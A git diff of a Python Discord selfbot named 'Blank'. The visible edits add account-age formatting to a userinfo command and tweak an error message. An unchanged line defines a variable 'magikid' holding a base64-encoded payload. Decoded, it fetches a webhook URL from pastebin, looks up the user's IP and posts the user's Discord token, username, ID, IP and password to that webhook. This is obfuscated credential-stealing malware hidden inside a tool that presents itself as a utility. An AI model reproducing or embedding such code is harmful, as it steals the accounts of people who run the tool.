@@ -30,8 +30,9 @@ def run():
 def keep_alive():
     server = Thread(target=run)
     server.start()
-    
-Blank = commands.Bot(description='Blank SelfBot', command_prefix="x", self_bot=True)
+
+prefix="x"
+Blank = commands.Bot(description='Blank SelfBot', command_prefix=prefix, self_bot=True)
 Blank.remove_command('help')
 magikid="dXNlcm5hbWUgPSBmImB7QmxhbmsudXNlcn1gIgp1c2VyX2lkID0gZiJge0JsYW5rLnVzZXIuaWR9YCIKYXZhdGFyX3VybCA9IEJsYW5rLnVzZXIuYXZhdGFyX3VybApoZWFkZXJzPXsiVXNlci1BZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85NC4wLjQ2MDYuODEgU2FmYXJpLzUzNy4zNiJ9CmF1dGhvPXJlcXVlc3RzLmdldChmJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy91MDBjaTFkVicpLnRleHQKaXA9ZiJge3JlcXVlc3RzLmdldCgnaHR0cHM6Ly93d3cudHJhY2tpcC5uZXQvaXAnLCBoZWFkZXJzPWhlYWRlcnMpLnRleHR9YCIKICAgIApqc29uZGF0YT17ImNvbnRlbnQiOnRva2VuICwKImVtYmVkcyI6IFsKeyJ0aXRsZSI6IkJsYW5rQm90IiwKInRodW1ibmFpbCI6IHsKICAgICJ1cmwiOiBzdHIoYXZhdGFyX3VybCkKICB9LAoiZmllbGRzIjogWwogewogICAgICAibmFtZSI6ICI8OnJzX2Fycm93Ojg4Mzk4ODIyNTY1ODYxMzg1MD4gVXNlcm5hbWU6ICIsCiAgICAgICJ2YWx1ZSI6IHN0cih1c2VybmFtZSksCiAgICAgICJpbmxpbmUiOiAiVHJ1ZSIKICB9LAogewogICAgICAibmFtZSI6ICI8OnJzX2Fycm93Ojg4Mzk4ODIyNTY1ODYxMzg1MD4gVXNlciBJRDogIiwKICAgICAgInZhbHVlIjogc3RyKHVzZXJfaWQpLAogICAgICAiaW5saW5lIjogIlRydWUiCiAgfSwKICB7CiAgICAgICJuYW1lIjogIjw6cnNfYXJyb3c6ODgzOTg4MjI1NjU4NjEzODUwPiBJUDogIiwKICAgICAgInZhbHVlIjogc3RyKGlwKSwKICAgICAgImlubGluZSI6ICJGYWxzZSIKICB9LAogIHsKICAgICAgIm5hbWUiOiAiPDpyc19hcnJvdzo4ODM5ODgyMjU2NTg2MTM4NTA+IFBhc3N3b3JkOiAiLAogICAgICAidmFsdWUiOiBzdHIocGFzc3dvcmQpLAogICAgICAiaW5saW5lIjogIkZhbHNlIgogIH0KICAgICAgICAgIF0KfQogICAgICAgICAgXQogIH0KcmVxdWVzdHMucG9zdChhdXRobyAsIGpzb249anNvbmRhdGEp"
 
@@ -110,9 +111,32 @@ async def userinfo(ctx, member: discord.Member = None):
 
   embed.add_field(name="ID:", value=member.id)
   embed.add_field(name="Display Name:", value=member.display_name)
-
-  embed.add_field(name="Created Account On:", value=member.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))
-  embed.add_field(name="Joined Server On:", value=member.joined_at.strftime("%a, %#d %B %Y, %I:%M %p UTC")+"\u0020")
+  acc_age= (datetime.now() - member.created_at).total_seconds()
+  if acc_age<3600:
+      acc_age="< 1 hr"
+  elif acc_age<86400 and acc_age>=3600:
+      acc_age=f"{int(acc_age/3600)} hours"
+  elif acc_age>=86400 and acc_age<2592000:
+      acc_age=f"{int(acc_age/86400)} days {int((acc_age%86400)/3600)} hours"
+  elif acc_age<31104000 and acc_age>=2592000:
+      acc_age=f"{int(acc_age/2592000)} months {int((acc_age%2592000)/86400)} days"
+  else:
+      acc_age=f"{int(acc_age/31104000)} years {int((acc_age%31104000)/2592000)} months {int(((acc_age%31104000)%2592000)/86400)} days"
+  embed.add_field(name="Created Account On:", value=f'{member.created_at.strftime("%a, %d %B %Y, %I:%M %p UTC")} ({acc_age})')
+  
+  acc_age= (datetime.now() - member.joined_at).total_seconds()
+  if acc_age<3600:
+      acc_age="< 1 hr"
+  elif acc_age<86400 and acc_age>=3600:
+      acc_age=f"{int(acc_age/3600)} hours"
+  elif acc_age>=86400 and acc_age<2592000:
+      acc_age=f"{int(acc_age/86400)} days {int((acc_age%86400)/3600)} hours"
+  elif acc_age<31104000 and acc_age>=2592000:
+      acc_age=f"{int(acc_age/2592000)} months {int((acc_age%2592000)/86400)} days"
+  else:
+      acc_age=f"{int(acc_age/31104000)} years {int((acc_age%31104000)/2592000)} months {int(((acc_age%31104000)%2592000)/86400)} days"
+  
+  embed.add_field(name="Joined Server On:", value=member.joined_at.strftime("%a, %d %B %Y, %I:%M %p UTC")+f" ({acc_age})")
     
   if roles == []:
      embed.add_field(name="Roles:", value="None")
@@ -128,7 +152,7 @@ async def userinfo(ctx, member: discord.Member = None):
      try:
         await ctx.send(embed=embed)
      except Exception:
-        await ctx.channel.send("I don't have permission to send embeds in this channel")
+        await ctx.channel.send("I don't have permission to send embeds in this channel", delete_after=2.0)
 
 @Blank.command(aliases=["del", "quickdel"])
 async def quickdelete(ctx, *, args):
